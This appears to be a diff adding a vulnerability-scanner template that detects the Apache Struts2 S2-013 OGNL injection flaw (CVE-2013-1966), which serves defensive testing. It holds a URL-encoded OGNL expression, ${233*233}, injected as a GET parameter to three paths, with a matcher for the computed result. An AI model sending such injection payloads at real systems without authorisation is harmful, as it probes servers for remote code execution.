@@ -1,0 +1,33 @@
+id: local-struts2-s2-013-math
+
+info:
+  name: Struts2 S2-013 OGNL Injection via includeParams URL Tag (CVE-2013-1966)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-013 (CVE-2013-1966) allows OGNL injection through the
+    <s:a> and <s:url> tags with includeParams="all". GET/POST parameters are
+    re-included in URLs and parsed as OGNL expressions. Safe math probe injects
+    ${233*233} as a GET parameter to /link.action; 54289 appears in the response
+    body within the rendered href attribute.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-013
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-1966
+  tags: safe-poc,struts2,s2-013,cve,cve2013,ognl,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/link.action?a=%24%7B233*233%7D"
+      - "{{BaseURL}}/S2-013/link.action?a=%24%7B233*233%7D"
+      - "{{BaseURL}}/index.action?a=%24%7B233*233%7D"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 200
